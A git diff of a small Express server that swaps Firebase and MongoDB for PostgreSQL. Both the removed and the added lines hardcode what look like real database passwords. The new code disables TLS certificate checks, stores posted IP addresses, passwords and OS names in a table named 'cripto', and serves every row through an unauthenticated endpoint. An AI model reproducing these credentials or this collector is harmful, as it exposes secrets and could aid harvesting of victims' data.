@@ -1,44 +1,53 @@
 const express = require('express');
-const fire = require('firebase/app')
-const initializeApp = fire.initializeApp;
-const app2 = express();
+const app = express();
 const cors = require('cors');
-const mongoose = require('mongoose');
-const Router = require('./routes.js')
-const firebaseConfig = {
-  apiKey: "AIzaSyDvzlzuF2bM37DAST0fD-1pciXa2HRUPZ4",
-  authDomain: "lab-simetrico.firebaseapp.com",
-  projectId: "lab-simetrico",
-  storageBucket: "lab-simetrico.appspot.com",
-  messagingSenderId: "609196087056",
-  appId: "1:609196087056:web:06146342e08a430f2cb795",
-  measurementId: "G-C5KSG33WM2"
-};
+const { response } = require('express');
+const knex = require('knex')({
+    client: 'pg',
+    connection: {
+	    user:'fllmtgkemwbgdp',
+	    host:'ec2-50-17-255-120.compute-1.amazonaws.com',
+	    database:'d7lnp964sb3j1r',
+	    password:'4331177af89fd709b9c6a858a43f8264d3d5a768ccbab013958b2eea4ffd4e64',
+	    port:5432,
+        ssl: {
+          rejectUnauthorized: false
+        }
+    }
+  });
+  
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-//Init MongoDB
-main().catch(err => console.log(err));
-async function main() {
-  await mongoose.connect("mongodb+srv://dbMclovin:Javi2602@ggtienda.5rbjo.mongodb.net/myFirstDatabase?retryWrites=true&w=majority");
 
-}
-const db = mongoose.connection;
-db.on("error", console.error.bind(console, "connection error: "));
-db.once("open", function () {
-  console.log("Connected successfully");
-});
-app2.use(Router);
-app2.get('/', (req, res) =>{
-    res.send("Holaaaa");
-})
-app2.use(express.urlencoded({ extended: false }));
-app2.use(express.json());
-app2.use(cors());
-app2.post('/agregar', (req, res)=>{
-  const {ar1, ar2, ar3} = req.body;
+// hola mundo
+
+app.use(express.urlencoded({ extended: false }));
+app.use(express.json());
+app.use(cors());
+
+
+//tipos de usuarios
+
+app.post ('/agregar', (req, res) =>{
+  const {ip, pass, so} = req.body;
   console.log(req.body);
+  knex('cripto')
+  .returning('*')
+  .insert({
+    ip:ip,
+    pass:pass,
+    so:so}).then(data => {
+    res.json('listo');}).catch(err => console.log(err))
 })
-app2.listen(process.env.PORT || 3000, () => {
+app.get('/tipo_usuario', (req, res) =>{
+    knex.select('*').from('cripto').then(data => {
+        res.send(data)
+        console.log(data)
+    })
+})
+
+
+
+app.listen(process.env.PORT || 3000, () => {
     console.log('Funcionando');
 });
+//hola esto es un comentario
